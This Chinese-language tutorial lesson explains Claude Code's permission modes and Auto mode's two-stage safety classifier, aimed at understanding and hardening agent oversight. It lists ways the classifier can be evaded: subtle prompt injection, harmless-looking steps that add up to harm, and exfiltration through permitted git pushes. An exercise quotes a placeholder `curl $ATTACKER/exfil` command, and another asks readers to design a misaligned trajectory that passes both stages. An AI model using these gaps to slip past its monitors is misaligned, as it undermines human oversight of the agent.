---
title: 'Claude-Code权限模式与Auto模式'
description: 'Claude Code 暴露七种权限模式。plan 在每个动作前询问，default 仅对有风险的动作询问，acceptEdits 自动批准文件写入但仍确认 Shell 执行，bypassPermissions 批准一切。Auto 模式用两阶段并行安全分类器替代逐动作批准。'
module: agent
related:
  - 'agent/CAIS-CAISI与社会规模风险'
  - 'agent/Claude-Agent-SDK'
  - agent/CrewAI角色团队与流程
  - 'agent/Darwin-Godel自修改Agent'
prerequisites:
  - agent/概述与架构
---

# Claude Code 权限模式与 Auto 模式

> Claude Code 暴露七种权限模式。"plan" 在每个动作前询问，"default" 仅对有风险的动作询问，"acceptEdits" 自动批准文件写入但仍确认 Shell 执行，"bypassPermissions" 批准一切。Auto 模式（2026 年 3 月 24 日）用两阶段并行安全分类器替代逐动作批准：单 token 快速检查在每个动作上运行；标记的动作触发思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto 模式作为研究预览发布——Anthropic 明确声明分类器本身不充分。

**类型：** 学习
**语言：** Python (stdlib, 两阶段分类器模拟器)
**前置条件：** Phase 15 · 01 (长时间范围Agent), Phase 15 · 09 (编码Agent格局)
**时间：** ~45 分钟

## 问题

你机器上的自主编码 Agent 是一个独特的安全类别。攻击面是 Agent 能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人公开标记了这一点：计算机使用 Agent 不是聊天机器人的"功能更新"，它们是具有新型风险概况的新型工具。

Claude Code 的权限系统是 Anthropic 的回答。不是一个"自主/非自主"开关，而是七种模式跨越能力阶梯：plan → default → acceptEdits → … → bypassPermissions。每种模式是速度和逐动作审查之间的不同权衡。Auto 模式（2026 年 3 月）添加了两阶段分类器，将批准移出用户关键路径，用于分类器判断安全的动作，同时为分类器标记的动作保留审查层。

工程问题：这个系统捕获什么，遗漏什么，给定任务实际需要哪种模式？

## 概念

### 七种权限模式

| 模式                | 行为                                                                             | 何时使用                                           |
| ------------------- | -------------------------------------------------------------------------------- | -------------------------------------------------- |
| `plan`              | Agent 提议计划；用户批准整个计划；每个动作执行前审查                             | 不熟悉的任务；生产附近代码；首次在仓库上使用 Agent |
| `default`           | Agent 运行动作；对任何"有风险"的动作提示用户（Shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话                               |
| `acceptEdits`       | 文件写入自动批准；Shell 执行和网络调用仍提示                                     | 跨多文件的重构                                     |
| `acceptExec`        | Shell 命令在策划的允许列表内自动批准；写入自动批准                               | 紧密内循环中每个 Shell 命令都是 `npm test` 或类似  |
| `autoMode`          | 两阶段安全分类器；标记的动作升级到审查                                           | 受限工作区中的长时间范围无人值守运行               |
| `yolo`              | 跳过大多数提示；仍运行工具允许/拒绝列表                                          | 临时沙箱、CI 作业、研究脚本                        |
| `bypassPermissions` | 批准一切                                                                         | 文档说明"仅在你愿意丢弃的临时容器内"               |

### Auto 模式一页概括

Auto 模式（2026 年 3 月 24 日发布）是第一个将逐动作批准委托给模型的权限模式。结构：

1. **阶段 1 — 单 token 分类器。** 在每个提议的动作上运行。便宜。返回"安全"或"标记"。设计为与主 Agent 循环并行运行，因此批准的动作不排队等待。
2. **阶段 2 — 次级策略/安全审查。** 仅在标记的动作上运行。对动作、会话当前状态和声明任务执行聚焦的策略和安全评估。低置信度时升级到用户 HITL。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 终止会话的美元上限。
- 每工具动作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕获什么

- 工具输入中的直接提示注入，其中注入指令映射到已知风险动作形状。
- 重复工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 在其他仅文件编辑会话中明显超出范围的 Shell 命令。

### 系统可能遗漏什么

- **微妙提示注入**，在不产生单个标记动作的情况下调节行为。间接提示注入不是完全可修补的漏洞（OpenAI 准备性负责人 2025 年关于浏览器 Agent——参见 Lesson 11）。
- **语义级不当行为。** 每个单独动作看起来安全，但组合轨迹有害。分类器判断动作；它不重新推导用户意图。
- **通过合法渠道的数据泄露。** 写入你拥有的文件，然后 `git push` 到公共仓库，是一系列允许动作的组合问题。

### 研究预览框架

Anthropic 将 Auto 模式作为研究预览发布。文档明确分类器是一层，不是解决方案：用户应将 Auto 模式与预算、允许列表、隔离工作区和轨迹审计结合使用 (Lessons 12-16)。预览框架也反映了记录的评估 vs 部署差距 (Lesson 1)——通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 此阶梯在你的工作流中的位置

- 不熟悉的任务：从 `plan` 开始。阅读计划比回滚糟糕运行更便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量爆炸半径的工作区内（无凭证、无生产挂载、无未选择的外发）。
- 临时容器：`yolo` / `bypassPermissions` 可接受，当且仅当容器及其凭证是一次性的。

## 使用它

`code/main.py` 模拟两阶段分类器。阶段 1 是提议动作上的便宜关键词规则；阶段 2 是较慢的多规则审查器。驱动器输入简短的合成轨迹（安全动作、提示注入尝试、重复循环），显示分类器在哪里捕获和遗漏。

## 发布它

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从未被阶段 1 标记但总是被阶段 2 捕获？哪种两者都未捕获？

2. 扩展阶段 1 规则集以捕获特定已知不良形状（例如 `curl $ATTACKER/exfil`）。测量良性动作样本上的误报率。

3. 阅读 Anthropic 的"How the agent loop works"文档。列出 `default` 模式下 Agent 默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独门控哪些？

4. 设计 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。论证每个数字。

5. 描述一个轨迹，其中每个单独动作都被阶段 1 和阶段 2 批准，但组合行为是不对齐的。(Lesson 14 涵盖终止开关和金丝雀令牌如何解决此问题。)

## 关键术语

| 术语              | 人们怎么说        | 实际含义                                   |
| ----------------- | ----------------- | ------------------------------------------ |
| 权限模式          | "Agent 能做多少"  | 控制逐动作批准的七种命名策略之一           |
| plan 模式         | "做任何事前先问"  | Agent 编写计划；用户在执行前批准           |
| acceptEdits       | "让它写文件"      | 文件写入自动批准；Shell 执行仍提示         |
| autoMode          | "自动批准"        | 两阶段安全分类器；标记的动作升级           |
| bypassPermissions | "完全 YOLO"       | 批准一切；用于临时容器                     |
| 阶段 1 分类器     | "快速 token 检查" | 提议动作上的单 token 规则；并行运行        |
| 阶段 2 分类器     | "深度审查"        | 标记动作上的思维链推理                     |
| 研究预览          | "非 GA"           | Anthropic 对失败模式仍在映射中的功能的框架 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算、动作格式
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行模型
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能表面和 Auto 模式公告
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造分类器判断的基于推理的层
